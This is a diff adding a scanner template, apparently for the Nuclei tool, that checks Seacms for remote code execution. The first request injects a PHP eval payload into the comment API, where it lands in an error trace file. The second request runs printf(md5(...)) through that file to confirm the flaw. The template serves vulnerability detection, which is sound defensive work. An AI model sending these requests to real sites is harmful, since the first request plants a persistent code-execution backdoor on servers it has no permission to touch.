@@ -1,0 +1,37 @@
+id: seacms-rce-ct-158384
+
+variables:
+  identifiers: '{{rand_base(8)}}'
+
+info:
+  name: Seacms Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a potential remote code execution (RCE) vulnerability in Seacms via specific endpoints.
+
+http:
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/data/mysqli_error_trace.php?_=printf(md5('{{identifiers}}'))%3B"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(identifiers)}}"
+        part: body
